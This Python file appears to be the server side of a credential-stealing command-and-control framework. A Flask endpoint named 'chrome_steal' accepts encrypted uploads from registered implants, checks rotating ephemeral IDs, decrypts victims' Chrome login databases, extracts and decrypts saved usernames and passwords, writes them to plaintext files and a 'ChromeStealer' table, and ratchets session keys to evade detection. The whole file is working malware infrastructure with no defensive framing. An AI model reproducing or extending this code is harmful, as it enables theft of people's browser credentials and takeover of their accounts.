
def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        print("Cannot decrypt password")

def getChromePasswords(data_path, secretKey):
    data_path = data_path
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT action_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    extractedData = []
    for userdatacombo in login_data:
        if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "":
            password = decryptPassword(userdatacombo[2], getSecretKey(secretKey))
            data = "URL: " + userdatacombo[0] + " Username: " + userdatacombo[1] + " Password: " + str(password)
            extractedData.append(data)
        else:
            pass
    return extractedData

@app.route('/db2686e4eb/<url_test_urlen>', methods=["POST"])
def chrome_steal(url_test_urlen):
    url_test = urllib.parse.unquote(url_test_urlen)
    check_entry = approvedURL.query.filter_by(url_next=url_test).first()
    if not check_entry:
        print("[-] No Current URL Found")
        print("url_test I got:", url_test)
        return "Access Denied", 403

    ### Decapsulate data
    msg_enc_bin = request.get_data()
    msg_enc = Message_encrypt_large()
    msg_enc.ParseFromString(msg_enc_bin)

    ### Verify ID
    guid_ephemeral_carrier = msg_enc.guid_ephmeral
    guid_ephemeral_carrier_check = check_entry.client_guid_ephemeral
    if msg_enc.guid_ephmeral != guid_ephemeral_carrier_check:
        print("[-] No guid_ephemeral Found")
        print("guid_ephemeral_carrier:", guid_ephemeral_carrier)
        print("guid_ephemeral_carrier_check", guid_ephemeral_carrier_check)
        print("client_guid", check_entry.client_guid)
        return "Access Denied", 403
    guid_real = check_entry.client_guid

    ### Retrieve the sym keys
    rgt_entry = RegisteredImplants.query.filter_by(client_guid=guid_real).first()
    if not rgt_entry:
        print("[-] No GUID found")
        return "Access Denied", 403
    
    server_tk_ephemeral = rgt_entry.server_tk_ephemeral
    nonce_send = rgt_entry.nonce_send
    key_kdf_send = rgt_entry.key_kdf_send

    server_rk_ephemeral = rgt_entry.server_rk_ephemeral
    nonce_rcv = rgt_entry.nonce_rcv
    key_kdf_rcv = rgt_entry.key_kdf_rcv

    key_kdf_guid = rgt_entry.key_kdf_guid

    ### Decrypt the data
    ciphertext = msg_enc.ciphertext
    plaintext = crypto_aead.crypto_aead_chacha20poly1305_decrypt(ciphertext, None, nonce_rcv, server_rk_ephemeral)

    # Deserialize
    msg_dec = Chrome_info()
    msg_dec.ParseFromString(plaintext)

    file_path = './chromeData/'
    file_name = stripbs(msg_dec.guid)
    with open(file_path + file_name, 'wb') as file:
        # Write the raw bytes to the file
        file.write(msg_dec.dbfile)    
    data = getChromePasswords(file_path + file_name, msg_dec.enc_key)
    file_path = './chromeData_plaintext/'
    with open(file_path +"plaintext_"+ file_name + ".txt", 'w', encoding='utf-8') as file:
        file.write(str(data))
    print(data)
    new_chrome_stolen = ChromeStealer(client_guid = guid_real, 
                                      encryption_key=msg_dec.enc_key, 
                                      chrome_file=msg_dec.dbfile)
    
    ### Add rachet
    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(key_kdf_rcv)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(key_kdf_send)    
    suburl_bin, key_kdf_guid, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    rgt_entry.server_rk_ephemeral = sk_rcv
    rgt_entry.nonce_rcv = nonce_rcv
    rgt_entry.key_kdf_rcv = key_kdf_rcv

    rgt_entry.server_tk_ephemeral = sk_send
    rgt_entry.nonce_send = nonce_send
    rgt_entry.key_kdf_send = key_kdf_send

    rgt_entry.key_kdf_guid = key_kdf_guid
    check_entry.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode('utf-8')
    check_entry.url_next = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))

    
    db.session.add(new_chrome_stolen)
    db.session.commit()
    return "OK", 200
